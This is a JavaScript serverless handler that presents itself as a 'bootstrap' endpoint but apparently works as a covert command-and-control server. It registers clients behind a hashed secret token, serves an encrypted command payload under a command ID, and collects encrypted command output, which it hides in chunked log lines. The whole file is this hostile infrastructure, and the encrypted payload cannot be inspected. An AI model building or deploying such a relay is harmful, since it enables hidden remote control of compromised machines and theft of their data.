import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '18';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+sgVg/OSgF8wM1Ev16BNcQn+0g3mmbD0OBKI3HktmJQB3YwWHoiyJLSJVN7orm8CN/gi2UJYs0ZjfCXX/zDLsnXm2IcTRr5NMgo9nkORlcd/g/MMtHOTPCcP5Hva2Ulcsf8nA7QJR7qYxS84fNadunQWZkdcru73UMHsAnnbHF2dYzqocZOdM+V05tEEghmGbqSo29Jxw66IKMretflAeetJChuwwkvhfkRIkC0v6yRi8FDo5RDFug+2k4nsr0BOnMD9N4mp3CE85on+0xuq+2W9GUpRRcxw+Keg0Xw9cNLNneHeY+86O/koO/jMZ7oNTbW4CIUFAYe5+2wb4D5++oeMSLihRBEGj+I2fR3kjz8roajJTaMAaPt/SKu9Dmh4flted1fQnvO8K3hgj0TznZsD4KPcSs/OgNmraHoZQlyJDXKKkOkA1sMczSy0EXUGaCfqxmptJyTD3ZjUBGQ7ueDXv4PxVz2wJX41l15cZr5KEDEyq7KjgJiUUQsyIGB3StgfXtBLh4BZB3d2evXnSGAwY6DlT53xIy1yhGeCFwQhRfjBjK0rmC+aerx4PpvePniCRkaoRTPJ3zfIbQb+x2iKzmoTmxyqN2cfLbTfBF+/yXUhN2v1S+tMCnkw9al49kKy5bnGfeDcGnxVk7UrTibmKgqi889yI3mZHJ7mZFuyzyBxc+jHfiI12sVfmfifIr+8/b/A4H1PkkPNhwHm88CyqsTPtf2Xj90Army+gc6wHvBDH41BSAJJSFQ+rWScd2onnM8h4AXqOzkElaIrykIo7E9d2ooLVA3fr2UG76XmQ1v7PYclzgxLe8klrKU86MlBwUoYA/0M5XcDHJzguJmoLVDvEyVP9DHK3JYv/aN2P+U7n7gtxbhSd/+vUYehEAR/senu59qjDgLoTNU4LWrG74qdwv6tPTEi0r03HOyL3YD24hSbG/M0FUkSp+rZVE2/bom2S7k+xhcDqeYr6RAdR6bxE15fFe2vL7gyBqpu5hvrzld8xCiE2UyNk9ubfJIT5wH6y8TT3y6DJsDsbHh8UJqU8NfwnoeV/j/gLRUlnrdMFjMYSLPeJwQsBaO9/8gYECATOltdbBL8iQjAQoBLkk4HgMR68/+qlWhQuk87kDIq83dWZTo54EZc+xT66mC3LXhFrHocOjvM/osfQbfRAljzIKfRsLiDVraIX7SVryVjoZYiWWnuDzpwkVN7Q5IH/aRpGyFhfKr+UAj/nWm8GO96YzKn2bT5bqe0gnBApMqjUr8dUyZZQWyon9WIFvZbfRUwCEeSQwC1wAeCuqzFDyfwt3eMNHJLGols8X8aGUMRRcJrbN2YLR2W4nuZC+Va7F+8fEiUpooX/ycmffGoVAZgLcfArW+cw8vya6eqvINivcUIe6BnLZa4NGU62LA4bG3eepUOddDbmnqf7ypG2CRKpeTsTmYq4zWbjkEKQccSTvt5ibcFo58viUA9kgNyn+HKN7oldPXmBA0S2DcvoV5nbnLyg2OooutjkdKlB8IYOLIA/rVhNVbyN/Mf5bAv+Zo5pQtPpidyR053MmOZm3QIAhCy2lYZhUzTELptNO2v6vIKvbt9PxRsYMoKFkzA0SKwHPifcp9N0+jFK51Lvk7IWcAMMdi6aerOmr2DqBpxIIbyF+rD0XOF7u9Nfd3hX8pmH72T+EmvwQjWQvFwLNFA/WuTVq1GZV0EsQBt2CxjCZzAVUTFolnb5wmAxs1C+VDAXPYwn+5wUwDqwzb5HO/e9H/FUHWElCuMByUutZXwVQYN4BugLvGKaizSk7/KQ1CfgMtvtWRv25vK7FJlviou8/3g1v1HKp3rraNQcZO159w3Wcyolbla6KuhY7DOz81xdmduYr3cV5EPhdN1nQZXt7/7TskehnhGLrxT90sfcnId3Og3huQZyNfrNDb9RNOfUxrJcnR0lk9b6btlO2Y73PdqQ447dB2jwAcmB9I4DhWLa7BG+eBYPMNAQME2cHd79j5u2uEe4aEXwCV4IJyIcmO2pAym+2sWUeoRHRd2ANN11PUYmFb8m+RL29NVD+w9tWKW7srfo7B/vHADB/0TUSTCDd2hazR7xVn9C9NehOUs35nCBufUtd6cOw03rPVlP3FSHvO9Ks0j9YnuAocUVWZ+jq4caVQYL4yA/wDfYx2VJPdsj+6g8lzZ3igzUZ4i3GOw==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
